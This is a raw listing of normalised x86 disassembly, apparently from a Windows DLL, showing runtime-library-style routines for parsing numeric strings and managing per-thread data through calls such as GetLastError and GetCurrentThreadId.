movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1ec
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10060ea7
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1001c5c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_1001e1bc
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1001e1ec
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001e1bc
sub_100435b0
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop esi
pop ebp
retn
push edi
jmp r-xdata
movzx eax [ esi ]
mov edi [ ebp + 0xc ]
push eax
call sub_1000a00e
mov [ edi ] ax
add [ ebp + 0xc ] 0x2
add esi 0x2
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_100435f4
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_10064c8e
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10025450
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_10020a90
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000a5ee
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10043670
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
js r-xdata
push edi
push 0x30
push esi
call sub_10024af0
mov edx [ esi + 0x4 ]
add edx 0x8
push edx
mov edi eax
push edi
push esi
call sub_100520a0
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc ] eax
jb r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_100436af
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10017bc2
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10043720
push ebp
mov ebp esp
push 0xffffffff
push sub_1008076d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10042df0
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1005d090
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000c8b0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10005d00
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
push esi
push ebx
call sub_10019070
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_1000c130
mov eax [ ebp - 0x120 ]
push eax
call sub_10065045
add esp 0x14
sub_10043f65
push 0x34
mov eax sub_1007ec03
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_1005e05a
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_1005e05a
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1005fb60
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_10039520
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_10037788
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10024aa0
mov eax [ ebp - 0x30 ]
call sub_10019c00
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10039dd0
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10044041
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_100446ed ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
